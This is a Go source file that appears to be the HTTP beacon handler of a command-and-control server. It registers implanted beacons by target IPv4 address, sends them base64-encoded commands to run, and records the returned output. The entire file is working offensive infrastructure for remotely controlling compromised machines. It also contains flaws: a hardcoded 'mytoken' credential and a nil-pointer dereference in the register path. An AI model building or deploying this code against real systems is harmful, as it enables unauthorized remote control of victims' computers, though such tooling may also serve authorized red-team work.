package abhttp

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/mojodojo101/c2server/pkg/activebeacon"
	"github.com/mojodojo101/c2server/pkg/models"
	"github.com/sirupsen/logrus"
	"net/http"
	"time"
)

type BeaconRequest struct {
	Id       int64  `json:"id"`
	Ipv4     string `json:"ipv4"`
	BId      int64  `json:"b_id"`
	TId      int64  `json:"t_id"`
	Token    string `json:"token"`
	Response string `json:"response"`
}
type BeaconResponse struct {
	Id    int64  `json:"id"`
	TId   int64  `json:"t_id"`
	Token string `json:"token"`
	Cmd   string `json:"cmd"`
}
type ResponseError struct {
	Message string `json:"message"`
}

type ActiveBeaconHandler struct {
	ABUsecase activebeacon.Usecase
}

func NewHandler(abu activebeacon.Usecase) ActiveBeaconHandler {
	return ActiveBeaconHandler{
		ABUsecase: abu,
	}

}
func (ah *ActiveBeaconHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	ctx := context.Background()
	bReq, err := ah.decode(ctx, r)
	if err != nil {
		logrus.Error(err)
		return
	}
	var bResp *BeaconResponse
	if bReq.Id == 0 {
		bResp, err = ah.register(ctx, bReq.Ipv4, bReq)
		if err != nil {
			logrus.Error(err)
			return
		}
	} else {
		bResp, err = ah.signIn(ctx, bReq)
		if err != nil {
			logrus.Error(err)
			return
		}
	}
	jResp, err := ah.encode(ctx, bResp)
	if err != nil {
		logrus.Error(err)
		return
	}
	fmt.Fprintf(w, jResp)

	return
}

func (ah *ActiveBeaconHandler) encode(ctx context.Context, bResp *BeaconResponse) (string, error) {

	bResp.Cmd = base64.StdEncoding.EncodeToString([]byte(bResp.Cmd))

	jResp, err := json.Marshal(bResp)
	if err != nil {
		logrus.Error(err)
		return "", err
	}
	return string(jResp), err

}
func (ah *ActiveBeaconHandler) decode(ctx context.Context, r *http.Request) (*BeaconRequest, error) {
	bReq := BeaconRequest{}
	err := json.NewDecoder(r.Body).Decode(&bReq)
	if err != nil {
		return nil, errors.New("Could not Unmarshal json, invalid beacon reponse")
	}

	fmt.Printf("Request = %v", bReq)
	data, err := base64.StdEncoding.DecodeString(bReq.Response)
	bReq.Response = string(data)
	return &bReq, err

}
func (ah *ActiveBeaconHandler) register(ctx context.Context, ipv4 string, br *BeaconRequest) (*BeaconResponse, error) {
	fmt.Printf("in register\n")
	ab := models.ActiveBeacon{}
	t, err := ah.ABUsecase.GetTargetByIpv4(ctx, ipv4)
	if err != nil {
		return nil, err
	}

	fmt.Printf("found Target\n")
	ab.BId = br.BId
	ab.TId = t.Id
	ab.PId = 0
	//change this token with a token generator algoritm
	ab.Token = "mytoken"
	ab.C2m = models.HTTP
	ab.UpdatedAt = time.Now()
	ab.CreatedAt = ab.UpdatedAt
	err = ah.ABUsecase.Register(ctx, &ab)
	if err != nil {
		return nil, err
	}
	bResp, err := ah.getNextCommand(ctx, &ab)
	if err == models.ErrItemNotFound {
		bResp.Cmd = ""
		bResp.Id = ab.Id
		bResp.Token = ab.Token
		bResp.TId = ab.TId
	}
	return bResp, err
}
func (ah *ActiveBeaconHandler) getNextCommand(ctx context.Context, ab *models.ActiveBeacon) (*BeaconResponse, error) {

	err := ah.ABUsecase.GetNextCmd(ctx, ab)
	if err != nil {
		return nil, err
	}
	bResp := BeaconResponse{}
	bResp.Cmd = ab.Cmd
	bResp.Id = ab.Id
	bResp.Token = ab.Token
	bResp.TId = ab.TId
	return &bResp, err
}
func (ah *ActiveBeaconHandler) signIn(ctx context.Context, bReq *BeaconRequest) (*BeaconResponse, error) {
	ab := &models.ActiveBeacon{}
	ab, err := ah.ABUsecase.GetByID(ctx, bReq.Id)
	if err != nil {
		return nil, err
	}

	err = ah.ABUsecase.SetCmdExecuted(ctx, ab, []byte(bReq.Response))
	if err != nil {
		return nil, err
	}
	bResp, err := ah.getNextCommand(ctx, ab)

	return bResp, err
}
